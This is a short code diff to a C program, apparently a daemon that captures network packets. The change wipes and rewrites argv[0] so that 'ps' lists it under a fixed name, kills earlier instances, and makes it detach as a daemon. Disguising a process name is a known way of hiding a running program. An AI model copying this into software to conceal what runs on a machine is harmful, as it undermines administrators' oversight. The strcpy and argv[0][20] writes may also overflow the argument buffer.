@@ -287,9 +287,11 @@ int main(int argc, char **argv)
             "| xargs -t kill -9 &> /dev/null", RUNNING_NAME);
     system(killcmd);
 
+    /* 'ps' ignores null terminator, and will print entire contents of argv[0] */
+    memset(argv[0], '\0', strlen(argv[0]));
     strcpy(argv[0], RUNNING_NAME);
-    /*daemonize(argv[0]);*/
-    openlog(argv[0], LOG_NOWAIT|LOG_PID, LOG_USER);
+    argv[0][20] = '\0';
+    daemonize(argv[0]);
 
     session = config_session();
     linklen = datalink_length(session); 
